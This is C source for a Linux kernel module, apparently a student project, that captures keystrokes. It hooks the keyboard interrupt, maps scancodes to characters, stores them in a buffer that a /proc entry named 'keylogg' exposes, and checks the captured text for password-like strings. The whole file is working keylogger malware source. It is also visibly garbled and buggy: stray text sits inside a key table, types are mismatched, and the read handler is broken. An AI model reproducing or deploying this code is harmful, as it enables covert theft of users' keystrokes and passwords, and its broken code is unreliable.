//project3 
//borrowed the list of keys from 
//https://github.com/arunpn123/keylogger/blob/master/keylogger.c#L17
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/module.h>
#include <asm/io.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include<linux/sched.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#define CAPS 0x2E
#define LEFT_SHIFT 0x2A
#define RIGHT_SHIFT 0x36
#define PROC_FILE_NAME "keylogg"
char specialkeys[]={'!','@','#','$','%','^','&','*','(', ')','{', '}'};
char buff[20];
char pass[1024];
unsigned char buffer[1024*1024];
int counter=0;
int inc=0;
int caps_on=0;
int shift_on=0; 
int read_out = 0;

static const char* lowerkey[]={ "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKS_", "_TAB_", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5", "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_", "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* capskey[]={ "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKS", "_TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",: er "[", "]" , "_ENT", "_CTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "_SHIFT", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "_SHIFT", "\0", "\0", " ", "_CAPSL", "_F1", "_F2", "_F3", "_F4", "_F5", "_F6", "_F7", "_F8", "_F9", "_F10", "_NUML", "_SCROLLL", "_HOME", "_UP", "_PGU", "-", "_LEFT", "5", "_RTARROW", "+", "_END", "_DOWN", "_PGD", "_INS", "_DEL", "\0", "\0", "\0", "_F11", "_F12", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENT", "CTRL", "/", "_PRTSCR", "ALT", "\0", "_HOME", "_UP", "_PGU", "_LEFT", "_RIGHT", "_END", "_DOWN", "_PGD", "_INSERT", "_DEL", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_PAUSE"};

static const char* shiftkey[]= { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKS", "_TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENT", "_CTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?", "_SHIFT", "\0", "\0", " ", "_CAPSL", "_F1", "_F2", "_F3", "_F4", "_F5", "_F6", "_F7", "_F8", "_F9", "_F10", "_NUML", "_SCROLLL", "_HOME", "_UP", "_PGUP", "-", "_LEFT", "5", "_RTARROW", "+", "_END", "_DOWN", "_PGDN", "_INS", "_DEL", "\0", "\0", "\0", "_F11", "_F12", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENT", "CTRL", "/", "_PRTSCR", "ALT", "\0", "_HOME", "_UP", "_PGU", "_LEFT", "_RIGHT", "_END", "_DOWN", "_PGD", "_INSERT", "_DEL", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_PAUSE"};

char findkey(unsigned char x){
  if (caps_on==1 && shift_on==0){
    return capskey[x];
  }
  else if (shift_on==1){
	shift_on = 0;
    return shiftkey[x];
  }
  else{
    return lowerkey[x];
  }
}

ssize_t simple_read(struct file *filp,char *buf,size_t count,loff_t *offp ){
  copy_to_user(pass, buffer, strlen(buffer));
  read_out = 1;
  memset(buffer, 0, strlen(buffer));
  return strlen(buffer);
}


struct file_operations proc_fops = {
 read: simple_read
};


int passchecking(int a){
if(read_out == 1){
  if(inc>=8){
    int lowerstrings =0;
    int specialkeys_count=0;
    int upperstrings=0;
    int i=0;
    int j=0;
    for(;i<inc;i++){
      if(buff[i]>='0'&&buff[i]<='9'){
	lowerstrings++;
      }
      if(buff[i]>='A'&&buff[i]<='Z'){
	upperstrings++;
      }
      for(;j<10;j++){
        if(buff[i]==specialkeys[j]){
          specialkeys_count++;
        }
      }
      j=0;
    }
    if((lowerstrings > 0 || specialkeys_count > 0)&& upperstrings>0){
      read_out =0;
      return 0;
    }
    else{
      read_out =0;
      return 1;
    }
  }
  else{
    read_out =0;
    return 1;
  }
}
}


irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs){
	static unsigned char scancode;
	char enterchar;
	scancode = inb (0x60);
	if(scancode==CAPS||scancode==RIGHT_SHIFT||scancode==LEFT_SHIFT){
	  if (scancode==CAPS){
	    if (caps_on==0){
	      caps_on=1;
	    }
	    else if(caps_on==1){
	      caps_on=0;
	    }
	  }
	  if (scancode==RIGHT_SHIFT||scancode==LEFT_SHIFT){
	    shift_on=1;
	  }
	}
	else{
	  enterchar=findkey(scancode);
	  	//printk("you pressed : %c ", enterchar);
	}
	if(strlen(enterchar)>0){
		if(inc != (1024*1024)){
			buffer[inc++]=enterchar;
		}
		else{
		inc=0;
		buffer[inc++]=enterchar;
		}
	}else{
		if(inc != (1024*1024)){
			buffer[inc++]=scancode;
		}
		else{
		inc=0;
		buffer[inc++]=scancode;
		}
	}
	return (irq_handler_t)IRQ_HANDLED;
}

int logger_init (void){
  proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
  return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "using_irq_handler", (void *)(irq_handler));
}

void Clean(void) {
  remove_proc_entry(PROC_FILE_NAME,NULL);
  
}

MODULE_LICENSE("GPL");
module_init(logger_init);
module_exit(Clean);
